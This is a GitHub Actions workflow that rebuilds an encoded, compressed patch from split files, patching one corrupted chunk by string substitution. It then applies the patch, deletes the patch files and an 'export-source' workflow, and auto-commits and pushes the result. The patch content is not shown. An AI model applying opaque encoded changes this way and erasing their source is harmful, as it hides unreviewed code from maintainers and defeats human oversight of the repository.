name: Apply Security Hardening Patch

on:
  pull_request:
    branches:
      - main

permissions:
  contents: write

concurrency:
  group: apply-security-hardening-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  apply:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - name: Checkout pull request branch
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          fetch-depth: 0

      - name: Verify and assemble patch
        shell: bash
        run: |
          set -euo pipefail
          export PATCH_TEMP="$RUNNER_TEMP"
          echo "d4b4e4ab670976ff06523bb3875d5bb1ea40e71a73a89cf68ecd00f18fd83351  .github/security-patch/fix-05-0" | sha256sum -c -
          echo "bad807a089140bf7594c2255f69fb746a90d1bb97b6309bfef8942642fe543bf  .github/security-patch/fix-05-1" | sha256sum -c -
          echo "ca1b913368ff1fbddacbb88f63b6e5d3be71bb32e8a3379ad87158c1304dcc37  .github/security-patch/fix-05-2" | sha256sum -c -
          echo "77fee9c96bdc212775ea34ab4cc49f1ae015f005043ce13b4d06795c47ce8821  .github/security-patch/fix-05-3" | sha256sum -c -
          python - <<'PY'
          import hashlib
          import os
          from pathlib import Path
          source = Path('.github/security-patch/part-00').read_text(encoding='utf-8')
          if len(source) != 6999 or source.count('Oo6lzT') != 1:
              raise SystemExit('unexpected part-00 corruption shape')
          repaired = source.replace('Oo6lzT', 'Oo6lz3T', 1)
          if hashlib.sha256(repaired.encode()).hexdigest() != 'f6154bb6f480099d078b284b3abbb3f1974adc4f07267ee9762dcb459753d010':
              raise SystemExit('repaired part-00 checksum mismatch')
          Path(os.environ['PATCH_TEMP'], 'part-00.repaired').write_text(repaired, encoding='utf-8')
          PY
          encoded="$RUNNER_TEMP/security.patch.gz.b64"
          compressed="$RUNNER_TEMP/security.patch.gz"
          patch="$RUNNER_TEMP/security.patch"
          cat \
            "$RUNNER_TEMP/part-00.repaired" \
            .github/security-patch/part-01 \
            .github/security-patch/part-02 \
            .github/security-patch/part-03 \
            .github/security-patch/part-04 \
            .github/security-patch/fix-05-0 \
            .github/security-patch/fix-05-1 \
            .github/security-patch/fix-05-2 \
            .github/security-patch/fix-05-3 \
            .github/security-patch/part-06 \
            .github/security-patch/part-07 > "$encoded"
          test "$(wc -c < "$encoded")" -eq 54268
          echo "42802775b05f82ccde6389c84f92681f59873220a5ea10ace5e790690c6ca357  $encoded" | sha256sum -c -
          base64 --decode "$encoded" > "$compressed"
          gzip -dc "$compressed" > "$patch"
          echo "1d2b003d801759bedb04fd14ac9f17ee05536430f6f2b5a2199154571deb1c0d  $patch" | sha256sum -c -
          git apply --check --ignore-space-change --ignore-whitespace "$patch"
          git apply --ignore-space-change --ignore-whitespace "$patch"
          rm -rf .github/security-patch
          rm -f .github/workflows/export-source.yml
          git diff --check

      - name: Commit hardened installer
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "security: harden installer and validate installed runtime"
          git push origin "HEAD:${{ github.event.pull_request.head.ref }}"
